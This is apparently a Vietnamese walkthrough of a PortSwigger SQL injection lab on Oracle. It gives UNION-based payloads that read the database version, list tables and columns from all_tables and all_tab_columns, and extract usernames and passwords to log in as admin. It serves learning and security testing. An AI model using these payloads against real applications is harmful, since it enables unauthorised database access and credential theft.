## SQL injection attack, listing the database contents on Oracle

> Bỏ qua xác định số trường có trong bảng nhé, chắc chắn là 2 cmnr :v
> Bỏ qua luôn xác định lỗi hiển thị ở đâu, vì chắc chắn nó sẽ ở dưới cùng :v

Nhưng mà database ở đây là Oracle nên chúng ta sẽ không **UNION SELECT ‘a’,’b’--** được mà phải là **UNION SELECT ‘a’,’b’ FROM DUAL--**

![](/imgs/SQL-Injection/28.png?raw=true)

Xác định phiên bản: **' UNION SELECT banner,NULL FROM v$version--**

![](/imgs/SQL-Injection/29.png?raw=true)

List ra toàn bộ tên database Oracle từ [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet): **SELECT * FROM all_tables**

Tương tự Oracle cũng có trường **table_name** để áp dụng vào: **' UNION SELECT table_name,NULL FROM all_tables--**

Trong đây sẽ có 1 bảng là **USERS_XEOUJT**, chúng ta sẽ tiến hành select ra các trường có trong bảng này.


![](/imgs/SQL-Injection/30.png?raw=true)

Câu query lấy ra tất cả các trường trong Oracle: 
> **SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'**

Vì thế câu query inject vào sẽ là 
> **' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_XEOUJT'--**

Ta sẽ thu được 2 columns là **PASSWORD_KCZZXF** và **USERNAME_LDDGDO**

![](/imgs/SQL-Injection/31.png?raw=true)

Select dữ liệu ra: **' UNION SELECT USERNAME_LDDGDO,PASSWORD_KCZZXF from USERS_XEOUJT--**

![](/imgs/SQL-Injection/32.png?raw=true)

Login tài khoản admin vào là solve

![](/imgs/SQL-Injection/33.png?raw=true)